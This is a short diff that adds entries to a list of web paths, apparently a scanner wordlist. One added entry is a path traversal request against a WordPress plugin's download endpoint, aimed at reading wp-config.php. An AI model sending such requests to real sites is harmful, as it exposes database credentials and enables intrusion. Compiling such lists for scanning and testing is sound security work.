@@ -883,3 +883,5 @@
 /installed_emanual_list.html
 /api/project
 /user.action
+/wp-json/wooconvo/v1/download-file?order_id=1&filename=../../../../wp-config.php
+/api/version
